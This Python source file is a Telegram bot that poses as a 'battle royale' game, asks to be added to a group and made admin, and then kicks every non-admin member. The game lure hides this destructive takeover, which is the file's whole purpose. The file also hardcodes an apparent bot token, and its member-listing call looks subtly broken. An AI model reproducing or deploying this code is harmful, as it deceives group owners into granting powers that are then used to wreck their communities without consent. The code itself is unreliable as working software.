import asyncio
import os
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatMemberStatus
from aiogram.utils import executor

TOKEN = os.getenv("BOT_TOKEN", "8861142827:AAHrkMWX8SvneyNzHr6RhtEuvzhKn7uU3fE")
BOT_USERNAME = os.getenv("BOT_USERNAME", "GameBattleRoyaleBot")

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

def add_button():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("➕ Добавить в чат", url=f"https://t.me/{BOT_USERNAME}?startgroup=start"))
    return kb

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.answer("🎮 Добро пожаловать в Epic Battle Royale!\nДобавьте бота в группу, чтобы начать игру.", reply_markup=add_button())

@dp.my_chat_member_handler()
async def on_add(update: types.ChatMemberUpdated):
    if update.new_chat_member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR):
        chat = update.chat.id
        await bot.send_message(chat, "🎮 Бот активирован! Дайте мне права администратора для игры.")
        await asyncio.sleep(10)
        me = await bot.get_chat_member(chat, bot.id)
        if me.status == ChatMemberStatus.ADMINISTRATOR and me.can_restrict_members:
            async for member in bot.get_chat_members(chat):
                if member.status not in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER):
                    try:
                        await bot.kick_chat_member(chat, member.user.id)
                        await bot.unban_chat_member(chat, member.user.id)
                    except:
                        pass
            await bot.send_message(chat, "✅ Все участники кикнуты.")
        else:
            await bot.send_message(chat, "❌ Нужны права администратора с возможностью кика.")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
